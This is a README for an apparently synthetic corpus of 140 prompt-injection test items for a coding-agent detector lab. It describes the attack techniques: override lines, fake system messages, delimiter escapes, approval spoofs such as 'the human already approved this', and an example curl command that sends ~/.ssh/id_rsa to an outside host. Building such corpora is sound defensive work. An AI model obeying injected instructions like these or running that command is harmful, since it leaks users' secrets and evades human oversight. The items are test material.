# injection-corpus

140 synthetic, original prompt-injection items for the M5 injection lab. Each line of
`corpus.jsonl` is one item a coding agent might meet while reading a ticket, a file, a tool
result or a web page, labelled so a heuristic detector can be measured against it.

## Format

`corpus.jsonl`, one JSON object per line: `{id, kind, technique, asi, source_channel, text}`.

- `id`: `inj001` … `inj140`.
- `kind`: `direct | indirect-tool-result | indirect-file | indirect-web | benign`.
- `technique`: `instruction-override | role-play | fake-system-message | tool-result-injection |
  data-exfiltration | encoding-obfuscation | delimiter-escape | approval-spoof | none`
  (`none` only on benign items).
- `asi`: one of `ASI01` … `ASI10` (OWASP Top 10 for Agentic Applications 2026) or `none`.
- `source_channel`: `ticket | file | tool_output | web | user`.
- `text`: the item, at most 600 characters.

## Composition

140 items: 90 non-benign across the eight attack techniques (each technique ≥ 8 items) and 50
benign (`technique = none`). Of the benign items, 34 are hard negatives that mention `ignore` or
`system` innocently ("ignore case when matching", "the system prompt is in docs/…"). Twenty of the
benign items are longer, realistic tool and file output (shell transcripts with `curl | jq`, docs
with URLs and query strings, environment-variable notes, migration notes, JSON payloads), so a
detector that fires on a URL or the word "environment" shows up as false positives. All ten ASI
ids appear.

The attacks look like what a coding agent reads: README lines, code comments, tool output, web
snippets and ticket bodies. They include encoding-obfuscated instructions (base64/hex/rot13 with
the plain intent recoverable), delimiter escapes (`</untrusted>`, `<system>`, triple-backtick
fences), fake system messages, approval spoofs ("the human already approved this"), exfiltration
(`curl https://…?d=$(cat ~/.ssh/id_rsa)`) and tool-result injections. A canary string
`CANARY-7f3a` appears in the exfiltration and instruction payloads so later stages can detect that
an injection was obeyed. No domain resolves (every URL uses `example.invalid`) and no secret is
real (look-alikes use clearly fake values).

## Regenerating

```bash
uv run python fixtures/injection-corpus/generate.py
```

The generator uses the standard library only and a fixed seed (`20261017`), so it rewrites the
same bytes; `tools/miubais/tests/test_injection_corpus.py` checks that along with the label and
length constraints. `--out PATH` writes somewhere else.
